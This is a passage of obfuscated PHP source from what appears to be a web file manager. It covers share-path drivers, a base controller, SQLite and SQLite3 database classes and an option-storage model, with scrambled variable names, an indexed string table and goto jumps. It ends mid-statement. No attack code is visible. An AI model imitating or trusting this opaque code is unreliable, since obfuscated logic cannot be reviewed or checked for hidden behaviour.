$_SERVER[öæÛ¿©¿]; $Ÿİ¨äÅ¸ = $this->model->sourceInfo($…¦¯Ä«á); if ($Ÿİ¨äÅ¸[$  ¼Ó—‹[496]] == $  ¼Ó—‹[91]) { header($  ¼Ó—‹[1482]); die; } $‡ÄÕêëı = $this->model->fileInfoGet($…¦¯Ä«á); $«Š®×ùÍ = $‡ÄÕêëı[$  ¼Ó—‹[559]] ? $‡ÄÕêëı[$  ¼Ó—‹[559]] : $«Š®×ùÍ; $©Ü‰‹Ä = isset($GLOBALS[$  ¼Ó—‹[181]]) && is_array($GLOBALS[$  ¼Ó—‹[181]]) ? $GLOBALS[$  ¼Ó—‹[181]][$  ¼Ó—‹[32]] : $Ÿİ¨äÅ¸[$  ¼Ó—‹[32]]; if ($–Î¬ÓÀä) { return IO::fileOutServer($‡ÄÕêëı[$  ¼Ó—‹[87]], $î·ØãÓ¼, $©Ü‰‹Ä, $«Š®×ùÍ); } IO::fileOut($‡ÄÕêëı[$  ¼Ó—‹[87]], $î·ØãÓ¼, $©Ü‰‹Ä, $«Š®×ùÍ); } public function fileOut($’â£Ş¸¹, $¨ŞĞàü = false, $‚œïã»‚ = false, $¸°¸¶¯ç = '') { $this->_fileOut($’â£Ş¸¹, $¨ŞĞàü, $‚œïã»‚, $¸°¸¶¯ç); } public function fileOutServer($Í³¯ì˜, $È š‘ÁÍ = false, $˜óÑ‹Úã = false, $«ˆÊ‰ÈÆ = '') { $this->_fileOut($Í³¯ì˜, $È š‘ÁÍ, $˜óÑ‹Úã, $«ˆÊ‰ÈÆ, !0); } protected function _fileOutImage($æ—óïŒ¨, $›•ä÷ù´ = 250) { $´´¡¼´ú =& $_SERVER[öæÛ¿©¿]; $µóİçË• = $this->model->pathInfo($æ—óïŒ¨); if ($µóİçË•[$´´¡¼´ú[496]] == $´´¡¼´ú[91]) { show_json($´´¡¼´ú[1483] . $æ—óïŒ¨, !1); } $ÇÌ©Ğ££ = $this->model->fileInfoGet($æ—óïŒ¨); $µóİçË•[$´´¡¼´ú[182]] = $ÇÌ©Ğ££[$´´¡¼´ú[87]]; $GLOBALS[$´´¡¼´ú[181]] = $µóİçË•; IO::fileOutImage($ÇÌ©Ğ££[$´´¡¼´ú[87]], $›•ä÷ù´); } public function fileOutImage($Šë„¶Öí, $Ô…†¬´ = 250) { $this->_fileOutImage($Šë„¶Öí, $Ô…†¬´); } public function fileOutImageServer($ûİğ‰ì™, $À¤óŠˆ = 250) { $this->_fileOutImage($ûİğ‰ì™, $À¤óŠˆ); } public function link($‘­†şÛ, $æÎüß®‚ = '') { $º›„Ü¥ı = $this->model->fileInfoGet($‘­†şÛ); return IO::link($º›„Ü¥ı[$_SERVER[öæÛ¿©¿][87]], $æÎüß®‚); } protected function parse($ùµ’±óµ) { $ÊŞ—·Õ— =& $_SERVER[öæÛ¿©¿]; if (strstr($ùµ’±óµ, $ÊŞ—·Õ—[8]) === !1) { return array($ÊŞ—·Õ—[504] => intval($ùµ’±óµ), $ÊŞ—·Õ—[87] => $ÊŞ—·Õ—[12], $ÊŞ—·Õ—[1479] => array()); } $¾Á©ÊÆò = explode($ÊŞ—·Õ—[8], trim($ùµ’±óµ, $ÊŞ—·Õ—[8])); if (count($¾Á©ÊÆò) < 2) { show_tips(clear_html($ùµ’±óµ) . $ÊŞ—·Õ—[1484]); } return array($ÊŞ—·Õ—[504] => intval($¾Á©ÊÆò[0]), $ÊŞ—·Õ—[87] => $¾Á©ÊÆò[1], $ÊŞ—·Õ—[1479] => array_slice($¾Á©ÊÆò, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Â¨³´¤õ) { $this->pathParse = $Â¨³´¤õ; $this->model = Model($_SERVER[öæÛ¿©¿][1478]); } public function getPathRoot() { $ßÆ¡‘¿ =& $_SERVER[öæÛ¿©¿]; return KodIO::makeShare($this->pathParse[$ßÆ¡‘¿[483]], $this->pathParse[$ßÆ¡‘¿[1302]]); } public function getPathOuter($È€õÄÃş) { $ô¢××½ =& $_SERVER[öæÛ¿©¿]; if (!$È€õÄÃş) { return $È€õÄÃş; } $§¨„Òñ = $this->parse($È€õÄÃş); return trim(KodIO::makeShare($this->pathParse[$ô¢××½[483]], $§¨„Òñ[$ô¢××½[483]]), $ô¢××½[8]); } public function isParentOf($ÌæÌ˜Ñ, $Ã÷Ÿ×) { $¢Œ™¾ÙÔ = IO::init($Ã÷Ÿ×); return $this->model->isParentOf($ÌæÌ˜Ñ, $¢Œ™¾ÙÔ->path); } protected function infoParse($Æèº»¿à, $•õä¯‰é = false, $¼ôğêØò = false) { $æÏ¦ğ– =& $_SERVER[öæÛ¿©¿]; static $”‰°û¬ = array(); $íğìüÔß = $this->pathParse[$æÏ¦ğ–[483]]; $ìŒ—Ã‚ô = trim($this->pathParse[$æÏ¦ğ–[1298]], $æÏ¦ğ–[8]); if (isset($”‰°û¬[$ìŒ—Ã‚ô]) && is_array($”‰°û¬[$ìŒ—Ã‚ô])) { return $”‰°û¬[$ìŒ—Ã‚ô]; } $óÏ‡ğªÜ = Action($æÏ¦ğ–[1485])->sharePathInfo($íğìüÔß, $ìŒ—Ã‚ô, $•õä¯‰é); $”‰°û¬[$ìŒ—Ã‚ô] = $óÏ‡ğªÜ; return $óÏ‡ğªÜ; } public function infoFull($÷…ùöø) { $ø¾ÊĞ„ =& $_SERVER[öæÛ¿©¿]; $‚¶­ôÕ¥ = explode($ø¾ÊĞ„[8], trim($÷…ùöø, $ø¾ÊĞ„[8])); if (count($‚¶­ôÕ¥) > 1) { $¦´½œå = implode($ø¾ÊĞ„[8], array_splice($‚¶­ôÕ¥, 1)); $·°ì™§È = $this->model->pathInfoByPath($‚¶­ôÕ¥[0], $¦´½œå); if (!$·°ì™§È) { return !1; } $this->pathParse[$ø¾ÊĞ„[1298]] = $·°ì™§È[$ø¾ÊĞ„[192]]; } return $this->infoParse($÷…ùöø); } public function listAll($ÔƒÃˆ») { $îÒĞ“¬œ =& $_SERVER[öæÛ¿©¿]; $áÛµÜøÓ = IO::info($this->pathParse[$îÒĞ“¬œ[87]]); if (!$áÛµÜøÓ) { return array(); } $ú™‹Ÿ«² = $this->model->listAll($ÔƒÃˆ»); $à²ñÒØÜ = Model($îÒĞ“¬œ[683])->getInfo($áÛµÜøÓ[$îÒĞ“¬œ[684]]); foreach ($ú™‹Ÿ«² as &$ôˆàó§‘) { check_abort(); $ôˆàó§‘[$îÒĞ“¬œ[90]] = Action($îÒĞ“¬œ[1485])->_shareItemeParse($ôˆàó§‘[$îÒĞ“¬œ[90]], $à²ñÒØÜ); } unset($ôˆàó§‘); return $ú™‹Ÿ«²; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($şáğÃò) { $this->pathParse = $şáğÃò; $this->model = Model($_SERVER[öæÛ¿©¿][1478]); } protected function infoParse($ØÖäò°Æ, $ÒÉøÑ½• = false, $äğÌåÒ = false) { $ôÁğ¿Á =& $_SERVER[öæÛ¿©¿]; return Action($ôÁğ¿Á[1305])->sharePathInfo($this->pathParse[$ôÁğ¿Á[87]], !0, $ÒÉøÑ½•); } public function listPath($ÃÉéìÈÍ, $ Œšßå™ = false) { $¼ºêÒÄ =& $_SERVER[öæÛ¿©¿]; $şëäÖóÖ = parent::listPath($ÃÉéìÈÍ, $ Œšßå™); if (!$şëäÖóÖ) { return $şëäÖóÖ; } if (is_array($şëäÖóÖ[$¼ºêÒÄ[1486]])) { $şëäÖóÖ[$¼ºêÒÄ[1486]] = Action($¼ºêÒÄ[1305])->shareItemInfo($şëäÖóÖ[$¼ºêÒÄ[1486]]); } foreach ($şëäÖóÖ as $™‚ßÍëø => $©‡Æ»½½) { if (!in_array($™‚ßÍëø, array($¼ºêÒÄ[86], $¼ºêÒÄ[85]))) { continue; } foreach ($©‡Æ»½½ as $ÂŠ„€ => $å«©Éš) { $şëäÖóÖ[$™‚ßÍëø][$ÂŠ„€] = Action($¼ºêÒÄ[1305])->shareItemInfo($å«©Éš); } } return $şëäÖóÖ; } public function listAll($ÒâƒºÍĞ) { $·×İêÀ™ =& $_SERVER[öæÛ¿©¿]; $Äá«Ä« = IO::info($this->pathParse[$·×İêÀ™[87]]); if (!$Äá«Ä«) { return array(); } $Üâé‡Öğ = $this->model->listAll($ÒâƒºÍĞ); foreach ($Üâé‡Öğ as &$İÇº‚Ñ) { $İÇº‚Ñ[$·×İêÀ™[90]] = Action($·×İêÀ™[1305])->shareItemInfo($İÇº‚Ñ[$·×İêÀ™[90]]); } unset($İÇº‚Ñ); return $Üâé‡Öğ; } } goto Aº§çà—¿Õ; c—Öä¹©ê: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ô™öÆËÊ =& $_SERVER[öæÛ¿©¿]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ô™öÆËÊ[6]] =& $config; $this->values[$ô™öÆËÊ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ô™öÆËÊ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($“µ…¼Çˆ) { if (1 === func_num_args()) { $this->{$“µ…¼Çˆ} = new $“µ…¼Çˆ(); } else { $İ‰‡˜í¾ = new ReflectionClass($“µ…¼Çˆ); $™îö‘—Ä = func_get_args(); array_shift($™îö‘—Ä); $this->{$“µ…¼Çˆ} = $İ‰‡˜í¾->newInstanceArgs($™îö‘—Ä); } return $this->{$“µ…¼Çˆ}; } public function routeBind($ÀÑ¯¡ã™, $šØùÉ†ì, $»ôµº = 3) { $’÷ˆ† =& $_SERVER[öæÛ¿©¿]; $‚ê·ó´™ = $this->in[$’÷ˆ†[9]]; $ÀÑ¯¡ã™ = str_replace($’÷ˆ†[10], $’÷ˆ†[11], trim(trim($ÀÑ¯¡ã™, $’÷ˆ†[8]), $’÷ˆ†[12])); if (!$ÀÑ¯¡ã™ || count($‚ê·ó´™) <= $»ôµº) { return !1; } $¬Ä´€ = !0; $¼î‚œğ = explode($’÷ˆ†[8], $ÀÑ¯¡ã™); for ($Ò¿¯îçÓ = 0; $Ò¿¯îçÓ < count($¼î‚œğ); $Ò¿¯îçÓ++) { if ($¼î‚œğ[$Ò¿¯îçÓ] != $‚ê·ó´™[$»ôµº + $Ò¿¯îçÓ]) { $¬Ä´€ = !1; break; } } if (!$¬Ä´€) { return; } call_user_func_array(array($this, $šØùÉ†ì), array()); } public function routeArgs($¦ûºÖáî = 3) { $ÉœÒåÚ = $this->in[$_SERVER[öæÛ¿©¿][9]]; if (count($ÉœÒåÚ) <= $¦ûºÖáî) { return array(); } $úûÈ¨æ = array(); for ($“îÖ“É = $¦ûºÖáî; $“îÖ“É < count($ÉœÒåÚ); $“îÖ“É += 2) { $úûÈ¨æ[$ÉœÒåÚ[$“îÖ“É]] = $ÉœÒåÚ[$“îÖ“É + 1]; $this->in[$ÉœÒåÚ[$“îÖ“É]] = $ÉœÒåÚ[$“îÖ“É + 1]; } return $úûÈ¨æ; } protected function assign($ ªİñÈÅ, $ç÷®Ñ¼Ş) { $this->values[$ ªİñÈÅ] = $ç÷®Ñ¼Ş; } protected function display($ÈŸÃŠØˆ) { ob_end_clean(); extract($this->values); require $this->tpl . $ÈŸÃŠØˆ; } } class DbSqliteBase extends Db { public function __construct($úœ€¦—¶ = '') { $ùà·ÁªĞ =& $_SERVER[öæÛ¿©¿]; if (!extension_loaded($ùà·ÁªĞ[13])) { think_exception(think_lang($ùà·ÁªĞ[14]) . $ùà·ÁªĞ[15]); } if (!empty($úœ€¦—¶)) { if (!isset($úœ€¦—¶[$ùà·ÁªĞ[16]])) { $úœ€¦—¶[$ùà·ÁªĞ[16]] = 438; } $this->config = $úœ€¦—¶; if (empty($this->config[$ùà·ÁªĞ[17]])) { $this->config[$ùà·ÁªĞ[17]] = array(); } } } public function connect($ûë‚ˆ¶ä = '', $¼Ä½´Ÿä = 0) { $ÕÅüƒğö =& $_SERVER[öæÛ¿©¿]; if (!isset($this->linkID[$¼Ä½´Ÿä])) { if (empty($ûë‚ˆ¶ä)) { $ûë‚ˆ¶ä = $this->config; } $¬Ö®ÙéŒ = !empty($ûë‚ˆ¶ä[$ÕÅüƒğö[17]][$ÕÅüƒğö[18]]) ? $ûë‚ˆ¶ä[$ÕÅüƒğö[17]][$ÕÅüƒğö[18]] : $this->pconnect; $”‘ÔÄ­™ = $¬Ö®ÙéŒ ? $ÕÅüƒğö[19] : $ÕÅüƒğö[20]; $this->linkID[$¼Ä½´Ÿä] = $”‘ÔÄ­™($ûë‚ˆ¶ä[$ÕÅüƒğö[21]], $ûë‚ˆ¶ä[$ÕÅüƒğö[16]]); if (!$this->linkID[$¼Ä½´Ÿä]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¼Ä½´Ÿä], 30000); if (1 != think_config($ÕÅüƒğö[22])) { unset($this->config); } } return $this->linkID[$¼Ä½´Ÿä]; } public function free() { $this->queryID = null; } public function query($‡¥é³ø´) { $„Ù›°†² =& $_SERVER[öæÛ¿©¿]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‡¥é³ø´; if ($this->queryID) { $this->free(); } think_action_status($„Ù›°†²[23], 1); think_status($„Ù›°†²[24]); $this->queryID = sqlite_query($this->_linkID, $‡¥é³ø´); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¯µÁÍƒù = $this->getAll(); return $¯µÁÍƒù; } } public function execute($õÈà¼–¢) { $ù‰¦ë³Ü =& $_SERVER[öæÛ¿©¿]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $õÈà¼–¢; if ($this->queryID) { $this->free(); } think_action_status($ù‰¦ë³Ü[25], 1); think_status($ù‰¦ë³Ü[24]); $éúÔ“£ = sqlite_exec($this->_linkID, $õÈà¼–¢); $this->debug(); if (!1 === $éúÔ“£) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[öæÛ¿©¿][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ºİ£˜ã¨ = sqlite_query($this->_linkID, $_SERVER[öæÛ¿©¿][27]); if (!$ºİ£˜ã¨) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $³›†ûË† = sqlite_query($this->_linkID, $_SERVER[öæÛ¿©¿][28]); if (!$³›†ûË†) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $­Ø°âŸĞ = array(); if ($this->numRows > 0) { for ($¥òÅ³Ñ = 0; $¥òÅ³Ñ < $this->numRows; $¥òÅ³Ñ++) { $­Ø°âŸĞ[$¥òÅ³Ñ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $­Ø°âŸĞ; } public function getFields($‰×ÊĞì) { $ıÇê“‡± =& $_SERVER[öæÛ¿©¿]; $òØÈ‰şÕ = $this->query($ıÇê“‡±[29] . $‰×ÊĞì . $ıÇê“‡±[30]); $™Ñ­âçÌ = array(); if ($òØÈ‰şÕ) { foreach ($òØÈ‰şÕ as $şÔåÔ¬ü => $Ú§ıøÂ) { $™Ñ­âçÌ[$Ú§ıøÂ[$ıÇê“‡±[31]]] = array($ıÇê“‡±[32] => $Ú§ıøÂ[$ıÇê“‡±[31]], $ıÇê“‡±[33] => $Ú§ıøÂ[$ıÇê“‡±[34]], $ıÇê“‡±[35] => (bool) ($Ú§ıøÂ[$ıÇê“‡±[36]] === $ıÇê“‡±[12]), $ıÇê“‡±[37] => $Ú§ıøÂ[$ıÇê“‡±[38]], $ıÇê“‡±[39] => strtolower($Ú§ıøÂ[$ıÇê“‡±[40]]) == $ıÇê“‡±[41], $ıÇê“‡±[42] => strtolower($Ú§ıøÂ[$ıÇê“‡±[43]]) == $ıÇê“‡±[44]); } } return $™Ñ­âçÌ; } public function getTables($˜€¢´Ï = '') { $£í¦Ğô¾ =& $_SERVER[öæÛ¿©¿]; $£‹ÎÆô… = $this->query($£í¦Ğô¾[45] . $£í¦Ğô¾[46] . $£í¦Ğô¾[47]); $Ü©œ³í° = array(); foreach ($£‹ÎÆô… as $õöÃº± => $Ñ‘ÏÚÙ¦) { $Ü©œ³í°[$õöÃº±] = current($Ñ‘ÏÚÙ¦); } return $Ü©œ³í°; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ùò½ë­Æ =& $_SERVER[öæÛ¿©¿]; $¨ÉõåÀ = sqlite_last_error($this->_linkID); $this->error = $¨ÉõåÀ . $Ùò½ë­Æ[4] . sqlite_error_string($¨ÉõåÀ); if ($Ùò½ë­Æ[12] != $this->queryStr) { $this->error .= LNG($Ùò½ë­Æ[48]) . $this->queryStr; } think_trace($this->error, $Ùò½ë­Æ[12], $Ùò½ë­Æ[49]); return $this->error; } public function escapeString($‹·…ÊÏó) { return sqlite_escape_string($‹·…ÊÏó); } public function parseLimit($Ğ¡Ì÷èË) { $÷ÓºÑØç =& $_SERVER[öæÛ¿©¿]; $îÑôÈƒÑ = $÷ÓºÑØç[12]; if (!empty($Ğ¡Ì÷èË)) { $Ğ¡Ì÷èË = explode($÷ÓºÑØç[50], $Ğ¡Ì÷èË); if (count($Ğ¡Ì÷èË) > 1) { $îÑôÈƒÑ .= $÷ÓºÑØç[51] . $Ğ¡Ì÷èË[1] . $÷ÓºÑØç[52] . $Ğ¡Ì÷èË[0] . $÷ÓºÑØç[53]; } else { $îÑôÈƒÑ .= $÷ÓºÑØç[51] . $Ğ¡Ì÷èË[0] . $÷ÓºÑØç[53]; } } return $îÑôÈƒÑ; } } class DbSqlite3Base extends Db { public function __construct($´×¾ŒåØ = '') { $ê¬êÖÕÕ =& $_SERVER[öæÛ¿©¿]; if (!class_exists($ê¬êÖÕÕ[54])) { think_exception(think_lang($ê¬êÖÕÕ[14]) . $ê¬êÖÕÕ[55]); } if (!empty($´×¾ŒåØ)) { if (!isset($´×¾ŒåØ[$ê¬êÖÕÕ[16]])) { $´×¾ŒåØ[$ê¬êÖÕÕ[16]] = 438; } $this->config = $´×¾ŒåØ; if (empty($this->config[$ê¬êÖÕÕ[17]])) { $this->config[$ê¬êÖÕÕ[17]] = array(); } } } public function connect($Ü’†œö« = '', $Ò€‹ŞÓõ = 0) { $üÉäÂÆô =& $_SERVER[öæÛ¿©¿]; if (!isset($this->linkID[$Ò€‹ŞÓõ])) { if (empty($Ü’†œö«)) { $Ü’†œö« = $this->config; } $this->linkID[$Ò€‹ŞÓõ] = new SQLite3($Ü’†œö«[$üÉäÂÆô[21]]); if (!$this->linkID[$Ò€‹ŞÓõ]) { think_exception($this->linkID[$Ò€‹ŞÓõ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Ò€‹ŞÓõ]->busyTimeout(30000); if (1 != think_config($üÉäÂÆô[22])) { unset($this->config); } } return $this->linkID[$Ò€‹ŞÓõ]; } public function free() { $this->queryID = null; } public function query($¤·ÜìÀ) { $®Ç¡³° =& $_SERVER[öæÛ¿©¿]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¤·ÜìÀ; if ($this->queryID) { $this->free(); } think_action_status($®Ç¡³°[23], 1); think_status($®Ç¡³°[24]); $this->queryID = $this->_linkID->query($¤·ÜìÀ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $”àè™‡¨ = $this->getAll(); $this->numRows = count($”àè™‡¨); return $”àè™‡¨; } } public function execute($‡×îùÔ›) { $²ä†ç½Ë =& $_SERVER[öæÛ¿©¿]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‡×îùÔ›; if ($this->queryID) { $this->free(); } think_action_status($²ä†ç½Ë[25], 1); think_status($²ä†ç½Ë[24]); $¦ÁÓ¸¶ = $this->_linkID->exec($‡×îùÔ›); $this->debug(); if (!1 === $¦ÁÓ¸¶) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[öæÛ¿©¿][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ºŒô¨Ï‹ = $this->_linkID->query($_SERVER[öæÛ¿©¿][27]); if (!$ºŒô¨Ï‹) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $š°Ş’Ü = $this->_linkID->query($_SERVER[öæÛ¿©¿][28]); if (!$š°Ş’Ü) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Î¸¹‚Ö = array(); while ($ß›²“µ† = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Î¸¹‚Ö[] = $ß›²“µ†; } $this->queryID->reset(); return $Î¸¹‚Ö; } public function getFields($ŸÚîÛó·) { $ü”Ñº®œ =& $_SERVER[öæÛ¿©¿]; $Ç„»ô¥î = $this->query($ü”Ñº®œ[29] . $ŸÚîÛó· . $ü”Ñº®œ[30]); $Ê®ŠîÌ¥ = array(); if ($Ç„»ô¥î) { foreach ($Ç„»ô¥î as $ª¡æü—Á => $è£®É¯İ) { $Ê®ŠîÌ¥[$è£®É¯İ[$ü”Ñº®œ[32]]] = array($ü”Ñº®œ[32] => $è£®É¯İ[$ü”Ñº®œ[32]], $ü”Ñº®œ[33] => $è£®É¯İ[$ü”Ñº®œ[33]], $ü”Ñº®œ[35] => (bool) ($è£®É¯İ[$ü”Ñº®œ[35]] === $ü”Ñº®œ[12]), $ü”Ñº®œ[37] => $è£®É¯İ[$ü”Ñº®œ[56]], $ü”Ñº®œ[39] => (bool) $è£®É¯İ[$ü”Ñº®œ[57]], $ü”Ñº®œ[42] => (bool) $è£®É¯İ[$ü”Ñº®œ[57]]); } } return $Ê®ŠîÌ¥; } public function getTables($ÒÛ»„ûà = '') { $íÓª¦ãÍ =& $_SERVER[öæÛ¿©¿]; $À÷ƒëêñ = $this->query($íÓª¦ãÍ[45] . $íÓª¦ãÍ[46] . $íÓª¦ãÍ[47]); $¾¹®ÈÇ = array(); foreach ($À÷ƒëêñ as $·ìô¼£Ó => $÷÷Íıîš) { $¾¹®ÈÇ[$·ìô¼£Ó] = current($÷÷Íıîš); } return $¾¹®ÈÇ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $İ½¨â¸³ =& $_SERVER[öæÛ¿©¿]; $this->error = $this->_linkID->lastErrorMsg(); if ($İ½¨â¸³[12] != $this->queryStr) { $this->error .= LNG($İ½¨â¸³[48]) . $this->queryStr; } think_trace($this->error, $İ½¨â¸³[12], $İ½¨â¸³[49]); return $this->error; } public function escapeString($²¶©ø±Ú) { $á“³¢½Õ =& $_SERVER[öæÛ¿©¿]; if ($this->_linkID) { return $this->_linkID->escapeString($²¶©ø±Ú); } return str_ireplace($á“³¢½Õ[58], $á“³¢½Õ[59], $²¶©ø±Ú); } public function parseLimit($ñ¼‘¨ıæ) { $†§ÛÌşÇ =& $_SERVER[öæÛ¿©¿]; $ı•šä¾Ä = $†§ÛÌşÇ[12]; if (!empty($ñ¼‘¨ıæ)) { $ñ¼‘¨ıæ = explode($†§ÛÌşÇ[50], $ñ¼‘¨ıæ); if (count($ñ¼‘¨ıæ) > 1) { $ı•šä¾Ä .= $†§ÛÌşÇ[51] . $ñ¼‘¨ıæ[1] . $†§ÛÌşÇ[52] . $ñ¼‘¨ıæ[0] . $†§ÛÌşÇ[53]; } else { $ı•šä¾Ä .= $†§ÛÌşÇ[51] . $ñ¼‘¨ıæ[0] . $†§ÛÌşÇ[53]; } } return $ı•šä¾Ä; } } goto b·¥ç —ˆ; eâÆ¿ëíƒì: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\145\x6d\117\160\x74\x69\157\156"; public $field = array(); public function listData($éÖ¬Ô°å = false, $Ç­±ßìÕ = "\x6d\x6f\x64\151\146\x79\124\x69\x6d\x65", $ ¸Š¨áé = false) { $½º·âÎÜ =& $_SERVER[öæÛ¿©¿]; $‡ªÍˆ¼í = Model($this->modelType)->get(!1, $this->optionType, !0); $ö¡Ğ±½û = array_values($‡ªÍˆ¼í); if ($ö¡Ğ±½û && $ö¡Ğ±½û[0] && !is_array($ö¡Ğ±½û[0])) { Model($this->modelType)->cacheRemove($this->optionType); $‡ªÍˆ¼í = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$‡ªÍˆ¼í) { return $éÖ¬Ô°å ? null : array(); } if (!$éÖ¬Ô°å && $éÖ¬Ô°å !== $½º·âÎÜ[229]) { $‡ªÍˆ¼í = array_filter(array_values($‡ªÍˆ¼í)); return array_sort_by($‡ªÍˆ¼í, $Ç­±ßìÕ, $ ¸Š¨áé, $½º·âÎÜ[483]); } return $‡ªÍˆ¼í[$½º·âÎÜ[484] . $éÖ¬Ô°å]; } public function insert($èØŒğ»û) { $ÀáøÍøÕ =& $_SERVER[öæÛ¿©¿]; $èØŒğ»û = array_field_key($èØŒğ»û, $this->field); $Á“§Õ¶ = Model($this->modelType)->get($ÀáøÍøÕ[485], $this->optionType . $ÀáøÍøÕ[486]); $Á“§Õ¶ = $Á“§Õ¶ ? $Á“§Õ¶ : 0; $èØŒğ»û[$ÀáøÍøÕ[483]] = ++$Á“§Õ¶; $èØŒğ»û[$ÀáøÍøÕ[232]] = time(); $èØŒğ»û[$ÀáøÍøÕ[88]] = time(); Model($this->modelType)->set($ÀáøÍøÕ[485], $Á“§Õ¶, $this->optionType . $ÀáøÍøÕ[486]); Model($this->modelType)->set($ÀáøÍøÕ[484] . $Á“§Õ¶, $èØŒğ»û, $this->optionType); return $Á“§Õ¶; } public function insertArr($¨è ¦ÖÏ) { $’”úäŸ =& $_SERVER[öæÛ¿©¿]; if (!$¨è ¦ÖÏ || !is_array($¨è ¦ÖÏ)) { return !1; } $´ãˆöêÅ = Model($this->modelType)->get($’”úäŸ[485], $this->optionType . $’”úäŸ[486]); $´ãˆöêÅ = $´ãˆöêÅ ? $´ãˆöêÅ : 0; $ƒ®é¦—› = array(); foreach ($¨è ¦ÖÏ as $Ãº¾ßâÉ) { $¢éÚ­ = array_field_key($Ãº¾ßâÉ, $this->field); $¢éÚ­[$’”úäŸ[483]] = ++$´ãˆöêÅ; $¢éÚ­[$’”úäŸ[232]] = time(); $¢éÚ­[$’”úäŸ[88]] = time(); $ƒ®é¦—›[$’”úäŸ[484] . $´ãˆöêÅ] = $¢éÚ­; } Model($this->modelType)->set($’”úäŸ[485], $´ãˆöêÅ, $this->optionType . $’”úäŸ[486]); Model($this->modelType)->set($ƒ®é¦—›, !1, $this->optionType); return $´ãˆöêÅ; } public function update($ã´ÙÆ²ç, $ÖÙîüÜõ) { $Ó˜Ğ»Ù =& $_SERVER[öæÛ¿©¿]; $ÖÙîüÜõ = array_field_key($ÖÙîüÜõ, $this->field); $İúÙ¹ŒÁ = $this->listData($ã´ÙÆ²ç); if (!$İúÙ¹ŒÁ || !$ã´ÙÆ²ç) { return !1; } $ÖÙîüÜõ = array_merge($İúÙ¹ŒÁ, $ÖÙîüÜõ); $ÖÙîüÜõ[$Ó˜Ğ»Ù[88]] = time(); return Model($this->modelType)->set($Ó˜Ğ»Ù[484] . $ã´ÙÆ²ç, $ÖÙîüÜõ, $this->optionType); } public function remove($œ¬¨®) { if (!$œ¬¨®) { return !1; } return Model($this->modelType)->remove($_SERVER[öæÛ¿©¿][484] . $œ¬¨®, $this->optionType); } public function removeArr($¾¬ôŸå) { if (!$¾¬ôŸå) { return !0; } $×™À¶„ = array(); foreach ($¾¬ôŸå as $Šôâ¿¨ü) { $×™À¶„[] = $_SERVER[öæÛ¿©¿][484] . $Šôâ¿¨ü; } return Model($this->modelType)->removeArr($×™À¶„, $this->optionType); } public function clear() { $ã¨é¯Æ¨ =& $_SERVER[öæÛ¿©¿]; Model($this->modelType)->remove($ã¨é¯Æ¨[485], $this->optionType . $ã¨é¯Æ¨[486]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Úµ›ÈÁ¼, $ãı°Ù®ı) { if (!$ãı°Ù®ı) { return !1; } $å¹óÙ»ø = $this->listData(); $å¹óÙ»ø = array_to_keyvalue($å¹óÙ»ø, $Úµ›ÈÁ¼); return isset($å¹óÙ»ø[$ãı°Ù®ı]) ? $å¹óÙ»ø[$ãı°Ù®ı] : !1; } public function findByName($ÈãóˆŠ½) { return $this->findByKey($_SERVER[öæÛ¿©¿][32], $ÈãóˆŠ½); } protected function resetData($â¿Æ‚) { $„²ùƒµÖ =& $_SERVER[öæÛ¿©¿]; if (!$â¿Æ‚) { return; } $â¿Æ‚ = is_array($â¿Æ‚) ? $â¿Æ‚ : array(); $Ğú–ôÖš = array(); for ($ÑÓšÎ¤ = 0; $ÑÓšÎ¤ < count($â¿Æ‚); $ÑÓšÎ¤++) { if (!$â¿Æ‚[$ÑÓšÎ¤] || !$â¿Æ‚[$ÑÓšÎ¤][$„²ùƒµÖ[483]]) { continue; } $Ğú–ôÖš[$„²ùƒµÖ[484] . $â¿Æ‚[$ÑÓšÎ¤][$„²ùƒµÖ[483]]] = $â¿Æ‚[$ÑÓšÎ¤]; } return Model($this->modelType)->set($Ğú–ôÖš, !1, $this->optionType); } private function getAutoName($¨Üô‚¥) { $•ß˜¬Ş = array_to_keyvalue($this->listData(), $_SERVER[öæÛ¿©¿][32]); if (!$•ß˜¬Ş || 